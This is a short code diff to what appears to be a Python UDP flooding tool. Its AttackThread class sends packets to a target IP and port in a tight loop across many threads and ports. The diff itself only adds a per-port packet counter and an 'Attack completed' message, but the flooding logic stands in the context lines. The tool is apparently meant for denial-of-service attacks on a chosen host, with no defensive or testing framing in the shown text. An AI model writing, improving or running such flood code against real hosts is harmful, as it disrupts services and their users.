@@ -36,6 +36,7 @@ class AttackThread:
                 sock.sendto(bytes_to_send, (self.ip, self.port))
                 sent += 1
                 self.packets_sent += 1
+                print(f"Port {self.port}: Packets sent: {self.packets_sent}", end="\r")
                 await asyncio.sleep(0.001)
         except KeyboardInterrupt:
             pass
@@ -98,6 +99,7 @@ def main():
     print("\nAttacking %s:%s with %d threads" % (args.ip, ', '.join(map(str, args.ports)), args.threads))
 
     asyncio.run(run_attacks(args.ip, args.ports, args.threads, args.packets))
+    print("\nAttack completed.                                  ")
 
 if __name__ == "__main__":
     print(LICENSE)
